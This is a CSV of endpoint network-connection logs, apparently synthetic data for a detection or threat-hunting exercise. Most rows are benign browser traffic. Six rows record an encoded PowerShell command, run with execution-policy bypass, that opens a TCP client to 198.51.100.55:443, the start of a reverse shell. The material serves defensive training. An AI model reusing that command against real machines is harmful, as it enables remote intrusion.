TimeGenerated,Timestamp,DeviceName,ActionType,LocalIP,LocalIPType,LocalPort,RemoteIP,RemoteIPType,RemotePort,RemoteUrl,Protocol,InitiatingProcessFileName,InitiatingProcessFolderPath,InitiatingProcessCommandLine,InitiatingProcessAccountName,InitiatingProcessSHA256,Type
2026-04-29T13:32:00Z,2026-04-29T13:32:00Z,WS-DEV-02,ConnectionSuccess,10.0.10.11,Private,59663,198.51.100.55,Public,443,,Tcp,powershell.exe,C:\Windows\System32,powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADgALgA1ADEALgAxADAAMAAuADUANQAiACwANAA0ADMAKQA=,dchen,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T13:32:30Z,2026-04-29T13:32:30Z,WS-DEV-02,ConnectionSuccess,10.0.10.11,Private,58066,198.51.100.55,Public,443,,Tcp,powershell.exe,C:\Windows\System32,powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADgALgA1ADEALgAxADAAMAAuADUANQAiACwANAA0ADMAKQA=,dchen,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T13:33:00Z,2026-04-29T13:33:00Z,WS-DEV-02,ConnectionSuccess,10.0.10.11,Private,57882,198.51.100.55,Public,443,,Tcp,powershell.exe,C:\Windows\System32,powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADgALgA1ADEALgAxADAAMAAuADUANQAiACwANAA0ADMAKQA=,dchen,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T13:33:30Z,2026-04-29T13:33:30Z,WS-DEV-02,ConnectionSuccess,10.0.10.11,Private,60507,198.51.100.55,Public,443,,Tcp,powershell.exe,C:\Windows\System32,powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADgALgA1ADEALgAxADAAMAAuADUANQAiACwANAA0ADMAKQA=,dchen,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T13:34:00Z,2026-04-29T13:34:00Z,WS-DEV-02,ConnectionSuccess,10.0.10.11,Private,52435,198.51.100.55,Public,443,,Tcp,powershell.exe,C:\Windows\System32,powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADgALgA1ADEALgAxADAAMAAuADUANQAiACwANAA0ADMAKQA=,dchen,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T13:34:30Z,2026-04-29T13:34:30Z,WS-DEV-02,ConnectionSuccess,10.0.10.11,Private,49541,198.51.100.55,Public,443,,Tcp,powershell.exe,C:\Windows\System32,powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADgALgA1ADEALgAxADAAMAAuADUANQAiACwANAA0ADMAKQA=,dchen,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T14:21:28Z,2026-04-28T14:21:28Z,SVR-WEB-01,ConnectionSuccess,10.0.20.10,Private,56022,142.250.80.110,Public,443,www.google.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,dchen,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T07:15:44Z,2026-04-29T07:15:44Z,SVR-DC-01,ConnectionSuccess,10.0.20.5,Private,64365,142.250.80.110,Public,443,www.google.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,mholmes,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T13:44:59Z,2026-04-29T13:44:59Z,WS-HR-03,ConnectionSuccess,10.0.10.12,Private,55277,13.107.42.14,Public,443,outlook.office365.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,jadams,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T19:06:57Z,2026-04-28T19:06:57Z,WS-HR-03,ConnectionSuccess,10.0.10.12,Private,54629,142.250.80.110,Public,443,www.google.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,dchen,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
